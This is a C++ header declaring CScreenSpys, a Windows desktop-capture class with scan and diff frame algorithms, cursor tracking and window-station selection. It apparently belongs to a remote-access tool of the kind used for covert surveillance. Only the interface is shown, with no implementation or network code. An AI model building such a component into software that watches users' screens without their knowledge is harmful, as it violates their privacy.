// ScreenSpy.h: interface for the CScreenSpys class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_SCREENSPY_H__5F74528D_9ABD_404E_84D2_06C96A0615F4__INCLUDED_)
#define AFX_SCREENSPY_H__5F74528D_9ABD_404E_84D2_06C96A0615F4__INCLUDED_
#include <windows.h>
#include "../../../common/CursorInfo.h"
#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

// 两种算法
#define ALGORITHM_SCAN	1	// 速度很快，但碎片太多
#define ALGORITHM_DIFF	2	// 速度很慢，也占CPU，但是数据量都是最小的

class CScreenSpys  
{
public:
	CScreenSpys(int biBitCount= 8, bool bIsGray= false, UINT nMaxFrameRate = 100);
	virtual ~CScreenSpys();
	LPVOID getFirstScreen();
	LPVOID getNextScreen(LPDWORD lpdwBytes);

	void setAlgorithm(UINT nAlgorithm);
	LPBITMAPINFO getBI();
	UINT	getBISize();
	UINT	getFirstImageSize();
	void	setCaptureLayer(bool bIsCaptureLayer);
private:
	BYTE m_bAlgorithm;
	UINT m_nMaxFrameRate;
	bool m_bIsGray;
	DWORD m_dwBitBltRop;
	DWORD m_dwLastCapture;
	DWORD m_dwSleep;
	LPBYTE m_rectBuffer;
	UINT m_rectBufferOffset;
	BYTE m_nIncSize;
	int m_nFullWidth, m_nFullHeight, m_nStartLine;
	RECT m_changeRect;
	HDC m_hFullDC, m_hLineMemDC, m_hFullMemDC, m_hRectMemDC;
	HBITMAP m_hLineBitmap, m_hFullBitmap;
	LPVOID m_lpvLineBits, m_lpvFullBits;
	LPBITMAPINFO m_lpbmi_line, m_lpbmi_full, m_lpbmi_rect;
	int	m_biBitCount;
	int	m_nDataSizePerLine;

	LPVOID m_lpvDiffBits; // 差异比较的下一张
	HDC	m_hDiffDC, m_hDiffMemDC;
	HBITMAP	m_hDiffBitmap;

	CCursorInfo	m_CursorInfo;
	void ScanScreen(HDC hdcDest, HDC hdcSrc, int nWidth, int nHeight); // 降低CPU
	int Compare(LPBYTE lpSource, LPBYTE lpDest, LPBYTE lpBuffer, DWORD dwSize);
	LPBITMAPINFO ConstructBI(int biBitCount, int biWidth, int biHeight);
	void WriteRectBuffer(LPBYTE	lpData, int nCount);
	bool ScanChangedRect(int nStartLine);
	void CopyRect(LPRECT lpRect);
	bool SelectInputWinStation();
	HWND m_hDeskTopWnd;
};

#endif // !defined(AFX_SCREENSPY_H__6600B30F_A7E3_49D4_9DE6_9C35E71CE3EE__INCLUDED_)
